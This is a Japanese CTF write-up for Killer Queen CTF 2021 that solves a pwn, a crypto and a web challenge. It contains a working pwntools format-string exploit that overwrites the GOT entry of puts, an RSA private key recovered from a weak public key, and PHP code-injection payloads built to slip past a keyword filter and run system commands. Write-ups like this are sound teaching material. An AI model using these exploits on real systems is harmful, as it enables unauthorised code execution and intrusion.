---
title: "Killer Queen CTF 2021 Writeup"
date: 2021-11-01T19:00:00+09:00
lastmod: 2021-11-01T19:00:00+09:00
draft: false
keywords: []
description: ""
tags: ["CTF"]
categories: ["CTF"]
author: ""
---
<img src="https://captureamerica.github.io/writeups/img/green_bar.png" alt="green_bar.png">
<img src="https://captureamerica.github.io/writeups/img/10_Nature_Themed_Icons_Cute_Earth_Icon.png" alt="Save The Earth!"> <b><font color="teal">Save The Earth! - 地球環境を守ろう！</font></b> <img src="https://captureamerica.github.io/writeups/img/10_Nature_Themed_Icons_Cute_Earth_Icon.png" alt="Save The Earth!">
<img src="https://captureamerica.github.io/writeups/img/green_bar.png" alt="green_bar.png">

{{% right %}}
<a href="https://translate.google.com/translate?hl=en&sl=ja&tl=en&u=https%3A%2F%2Fcaptureamerica.github.io%2Fwriteups%2Fpost%2Fkillerqueen_ctf_2021%2F">
<img src="https://captureamerica.github.io/writeups/img/En.png" alt="English">
</a>
{{% /right %}}

URL: [https://2021.killerqueenctf.org/ctfpage?page=challenges](https://2021.killerqueenctf.org/ctfpage?page=challenges)
<br /><br />

スコアボードが見れないので、最終順位はわかりません。

<br>

<img src="https://captureamerica.github.io/writeups/img/killerqueen_CTF_2021_Score1.png" alt="killerqueen_CTF_2021_Score1.png">

<br><br>
<!--
<img src="https://captureamerica.github.io/writeups/img/killerqueen_CTF_2021_Score2.png" alt="killerqueen_CTF_2021_Score2.png">
-->
<br />


<br /><br />
## [Pwn]: Tweety Birb
- - -
### Challenge
> Pretty standard birb protection (nc 143.198.184.186 5002)

Attachment:

- tweetybirb (ELF 64-bit)

<br />

### Solution
タイトルからして、Canaryのチェックをバイパスするチャレンジっぽいですね。

確かにCanaryは有効、PIEは無効です。

<pre>
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
</pre>

<br />

Ghidraでソースを確認します。

{{< highlight c "linenos=table,hl_lines=12 13 15" >}}
undefined8 main(void)

{
  long in_FS_OFFSET;
  char local_58 [72];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  puts(
      "What are these errors the compiler is giving me about gets and printf? Whatever, I have this little tweety birb protectinig me so it\'s not like you hacker can do anything. Anyways, what do you think of magpies?"
      );
  gets(local_58);
  printf(local_58);
  puts("\nhmmm interesting. What about water fowl?");
  gets(local_58);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}


void win(void)

{
  system("cat /home/user/flag.txt");
  return;
}

{{< / highlight >}}

<br />

なお、フラグは `kqctf{tweet_tweet_did_you_leak_or_bruteforce_..._plz_dont_say_you_tried_bruteforce}` だったので、おそらく想定解は、まずFSBでCanaryをLeakし、それを使って2回目のgets()でCanaryを上書きしつつBOFを起こす、みたいなことだと思います。

<br />

別解として、FSBでputs()をwin()に書き換えてやってもフラグは取れました。

```Python
#!/usr/bin/env python
# -*- coding:utf-8 -*-

from pwn import *
context(arch='amd64', os='linux')

s = remote('143.198.184.186', 5002)

elf = ELF('./tweetybirb', checksec=False)
win_addr = elf.symbols["win"]
payload = fmtstr_payload(6, {elf.got.puts: win_addr})
s.sendlineafter(b' magpies?\n', payload)

msg = s.recvline()
print(msg)
s.close()
```

<br />

実行結果：

<pre>
$ ./tweetybirb_solve.py
[+] Opening connection to 143.198.184.186 on port 5002: Done
b'   \x03   \x00   \x80aaaaba\x18@@kqctf{tweet_tweet_did_you_leak_or_bruteforce_..._plz_dont_say_you_tried_bruteforce}\n'
[*] Closed connection to 143.198.184.186 port 5002
</pre>


<br />

Flag: `kqctf{tweet_tweet_did_you_leak_or_bruteforce_..._plz_dont_say_you_tried_bruteforce}`



<br /><br />
<br /><br />
## [Crypto]: Cloudsourcing
- - -
### Challenge
> Sourced in the cloud

Attachment:

- key.pub
- mystery.txt

key.pubの中身：
<pre>
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAzTf73VQrgsjh5aRpcE1w
aspEO5B48ZgjIfZyloCzR5cC2Rc1e+YwvI/2hNPuageLgmjOqk6FLO3dxa2kemzH
2EBG+n7RHlxIe4z6hobXCkXM4Sd4O7NvHlkebe5ULoOvpJxs5f7LB4zNffl49MLV
RmGJOWI33LVPi86VQg53U5nVCUTndmqWJsnjf06aeNJb0htFA1oy7eA9GaaNyBZC
7recU+pj5CJmnlitxaSaLLTahi7mlW92j4LDnDnIODhEtxqmWA3sMLoMGGwlve1+
cXd4+r1ovhkBWmkBR5/lp/p2KQLspet5HzDZgAlvQzA0Cw2q6B2mt33hgVb7JfT8
WQIDAQAB
-----END PUBLIC KEY-----
</pre>

<br />

mystery.txtの中身

<pre>
Oz5cG3uh6HGoPTsM9yERR2senJ+flkD9dikgzIDimT7xvguYEHGCMvYiD5F5dwbDIlvM7SqYxbzsx5L7+Kfg5OkvrJOMdc7tEsQK7L4n4QSN2mhxVP0AjxpHgufob+MfvL7/36grb6taeW8l5uLUveZ3aPK/XJt35znPScCxTLShFGj0xc/aCxRZYV+oNT6ygyPV4RSGh8v/yeY9bY1wIjYfQLqufKeogcsdBtBXTYQGCX+JQo9NVBLNkU7zQLT+AKit68HkTsORXhjNBFqvj4hQs3jB4rfUt54MKoDDuK0BFrfACKJIQe2LpmBtrVznlyfygIBfmFwrdkHRDi9bdA==
</pre>

<br />

### Solution
key.pubからPrivate keyを作成します。

<pre>
$ ~/Python3/RsaCtfTool/RsaCtfTool.py --publickey ./key.pub --private
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAzTf73VQrgsjh5aRpcE1waspEO5B48ZgjIfZyloCzR5cC2Rc1
e+YwvI/2hNPuageLgmjOqk6FLO3dxa2kemzH2EBG+n7RHlxIe4z6hobXCkXM4Sd4
O7NvHlkebe5ULoOvpJxs5f7LB4zNffl49MLVRmGJOWI33LVPi86VQg53U5nVCUTn
dmqWJsnjf06aeNJb0htFA1oy7eA9GaaNyBZC7recU+pj5CJmnlitxaSaLLTahi7m
lW92j4LDnDnIODhEtxqmWA3sMLoMGGwlve1+cXd4+r1ovhkBWmkBR5/lp/p2KQLs
pet5HzDZgAlvQzA0Cw2q6B2mt33hgVb7JfT8WQIDAQABAoIBADrihoWyoi2L4K3Z
KFwODGTIFx4UTW/dXK9hHO4sjcTMAwgxzan4miFxGaZxfWa1NYW89xgNIc+LjWgs
dBag4hMeFn/IJc8VYcL55+T0Cf4rmyc8ARb4XLkTj1Sx3zvdk2ejbufr3WwULd6o
19k7kqD4Wby6fxb4e5O9OjzTE9BLvr1NpHN1QRUupSUX3kv/mhtO3gQrRrkAT1L2
Ais+piqHmSrtX6YAnjood9oW2qy6oyBWvA11ipY9ZqfpI2G5Qc9WtViH/Erz2/3S
wFf0J9pgn+iAPbhcGwVh6U/cF+BcQZGse9GaY5Us4SJaQmM0ZdKiYbhKTRGBkudH
60sqeDUCgYEA0mwnrjcDpoc5Kv7qMB4AQCwP6LKnaG5q8Tc86JzYaPEnfUzl4trO
TruiSXmsok8RM/OLdAiIYiazz3GWgxFVNGtv+cEk4AKQnu2iRg5kP4wKBzqhYCnT
gMMMnt2UQfUrPOX7WDHaqQaOxkF06GJeHY7/RMswdOlXWx3w4oo2LJMCgYEA+atH
z0eS+0wzV4lubfpNl/6gi6KJxnpoPJtDt2vJBAa24fbS6ox9bx+Riki/CkpWiGDs
mb2ha1j5580kzDLfJjt1rncCd1iJy+S8zXmX0I1lkmhCnGKjsDDP4nqGmWoHyc9U
HxBYPWd2RtKNcBVDLImxr9IGe74GArU0Q2TmcuMCgYAvtwDEe4sjXvRysH1QTe1G
n/c3kBNwFeHAMwNnx/E20sBepGpYp78ykU+6k5G2+HDxM9/CfxDWGOqbNqmnrO2C
Rn6MxuRiu5Ipx78NXcQTuOCpRP1E/hcM0q3w9FPjJQIZ/BijpiJsQ6VqhXtKGsw2
ra9q3Rxu1l7NtZti825XawKBgHMG2LTE8xDYUKc56Ci/M1SduXXb0sIgzzltB0vQ
WvKB7Ww5/X6Wb4vs7W7aiTnCeg+nKBrE5UPB4JFNUHDL10eUCWnx5q75mbLYlavN
I4awPmWvp1DJmUSpmH1tmenAkgoGfWk6bI0Nx85lX0iOYz53yeeJSfdk2vwQZB3Q
tOOlAoGBAM83orP3tq+o57yvX/v36APtNW7ja7fMnSnmZRuWyJDqCJMNvGRlGObt
hfLludqNeJ4BSJ1nZNqbIvukk8J7DDukrGE5WxP+L1UmuIcTLgOeW7heMEUFbuVG
SpUX47+QBmx6Q8mHa97x/sGidZMlOEBG38bhvfdMgX0pW8zO+Oll
-----END RSA PRIVATE KEY-----
</pre>

<br />

mystery.txtは、一回 Base64 Decode しておいて、opensslコマンドを使って復号します。

<pre>
$ cat mystery.txt | base64 -d > mystery2.txt

$ openssl rsautl -decrypt -inkey key.pri -in mystery2.txt -out secret-decrypted.txt

$ cat secret-decrypted.txt
kqctf{y0uv3_6r4du473d_fr0m_r54_m1ddl3_5ch00l_abe7e79e244a9686efc0}
</pre>

<br />

Flag: `kqctf{y0uv3_6r4du473d_fr0m_r54_m1ddl3_5ch00l_abe7e79e244a9686efc0}`


<br /><br />
<br /><br />
## [Web]: PHat Pottomed Girls
- - -
### Challenge
> Now it's attempt number 3 and this time with a Queen reference! (flag is in the root directory) (Link)

Attachment:

- addnote.php

中身：

```php
<?php
session_start();

function generateRandomString($length = 15) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
function filter($originalstring)
{
    $notetoadd = str_replace("<?php", "", $originalstring);
    $notetoadd = str_replace("?>", "", $notetoadd);
    $notetoadd = str_replace("<?", "", $notetoadd);
    $notetoadd = str_replace("flag", "", $notetoadd);

    $notetoadd = str_replace("fopen", "", $notetoadd);
    $notetoadd = str_replace("fread", "", $notetoadd);
    $notetoadd = str_replace("file_get_contents", "", $notetoadd);
    $notetoadd = str_replace("fgets", "", $notetoadd);
    $notetoadd = str_replace("cat", "", $notetoadd);
    $notetoadd = str_replace("strings", "", $notetoadd);
    $notetoadd = str_replace("less", "", $notetoadd);
    $notetoadd = str_replace("more", "", $notetoadd);
    $notetoadd = str_replace("head", "", $notetoadd);
    $notetoadd = str_replace("tail", "", $notetoadd);
    $notetoadd = str_replace("dd", "", $notetoadd);
    $notetoadd = str_replace("cut", "", $notetoadd);
    $notetoadd = str_replace("grep", "", $notetoadd);
    $notetoadd = str_replace("tac", "", $notetoadd);
    $notetoadd = str_replace("awk", "", $notetoadd);
    $notetoadd = str_replace("sed", "", $notetoadd);
    $notetoadd = str_replace("read", "", $notetoadd);
    $notetoadd = str_replace("system", "", $notetoadd);

    return $notetoadd;
}

if(isset($_POST["notewrite"]))
{
    $newnote = $_POST["notewrite"];

    //3rd times the charm and I've learned my lesson. Now I'll make sure to filter more than once :)
    $notetoadd = filter($newnote);
    $notetoadd = filter($notetoadd);
    $notetoadd = filter($notetoadd);

    $filename = generateRandomString();
    array_push($_SESSION["notes"], "$filename.php");
    file_put_contents("$filename.php", $notetoadd);
    header("location:index.php");
}
?>
```

<br />

### Solution
3回フィルターがかかるので、それを見越して文字列を組みます。

`<<<<???? syssyssyssystemtemtemtem("ls -al /"); ????>>>>`

/flag.php があるのがわかるので、それを読みます。

`<<<<???? syssyssyssystemtemtemtem("cacacacatttt /flflflflagagagag.php"); ????>>>>`

<br />

Flag: `flag{wait_but_i_fixed_it_after_my_last_two_blunders_i_even_filtered_three_times_:(((}`



<br /><br />
<br /><br />
- - -
<br /><br />
<br /><br />
